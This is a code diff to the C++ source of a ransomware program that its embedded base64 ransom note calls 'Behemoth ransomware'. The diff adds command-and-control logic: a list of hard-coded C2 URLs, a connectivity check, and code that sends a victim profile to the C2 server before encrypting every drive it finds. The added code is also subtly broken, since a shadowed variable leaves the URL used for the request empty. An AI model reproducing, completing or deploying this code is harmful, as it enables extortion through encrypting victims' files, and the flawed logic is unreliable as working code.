@@ -10,6 +10,8 @@
 #include "Core/file_search.h"
 #include "Core/file_enc.h"
 #include "Communication/sendrequest.h"
+#include "Communication/google_conn.h"
+#include "Communication/c2_conn.h"
 #include "Helpers/convert_to_wstring.h"
 #include "Helpers/save_results.h"
 #include "Helpers/gen_str.h"
@@ -22,33 +24,44 @@
 #include "Helpers/profiler.h"
 #include "Helpers/line_count.hpp"
 #include "Helpers/base64decode.hpp"
+#include "Helpers/wstringToString.hpp"
 
 
 std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
 std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";
 
-bool ONLINE_ENC = false;
-int encryption();
-std::string C2_URL = "";                /// populate this with if statements inside main
+bool ONLINE_ENC = true;
+std::wstring C2_URL = L"";                /// populate this with if statements inside main
+std::vector<std::wstring> URLS = {
+        L"http://10.0.0.140/",
+        L"https://10.0.0.113:5000/",
+        L"http://10.0.0.10:6532/"
+};
 
+
+int encryption(bool status);
 
 
 int main() {
-    
     if (ONLINE_ENC) {
         // check connection with google
-
-        // if connection google succeeded, check connection with C2 and retrieve a valid c2 URL
-
-        // if a valid C2 is returned, begin online encryption 
-        encryption();
-
-        // if connection to either of those fail, begin offline encryption 
+        if (googleConn()) {
+            // if connection google succeeded, check connection with C2 URLs and retrieve a valid c2 URL
+            std::wstring C2_URL = c2_conn(URLS) + L"new-user";
+            // if no live C2 is found, begin offline encryption:
+            if (C2_URL.empty()) {
+                encryption(false);
+            }
+            // otherwise, begin online encryption
+            else{
+                encryption(true);
+            }
+        }
     }
 
     if (!ONLINE_ENC) {
         // if offline encryption: begin offline encryption & use hard-coded key and readme
-        encryption();
+        encryption(false);
     }
     
 
@@ -58,7 +71,7 @@ int main() {
 }
 
 
-int encryption() {
+int encryption(bool status) {
     // Identify all drives
     std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
     // Store all logical drives to an array
@@ -94,13 +107,13 @@ int encryption() {
 
 
     // if encryption is online, send profile & get instructions and public key from c2 
-    if (ONLINE_ENC) {
+    if (status) {
         // set value for total number of writable files
         std::string filesCount = countNonEmptyLines(filePath);
         // send profile to c2
         nlohmann::json profileJson = profiler(filesCount);
         std::cout << profileJson.dump(4) << std::endl;
-        std::string response = sendrequest(L"https://10.0.0.113:5000/new-user", profileJson);
+        std::string response = sendrequest(C2_URL, profileJson);
 
         // read json response and write it to global variables:
         auto jsonResponse = nlohmann::json::parse(response);
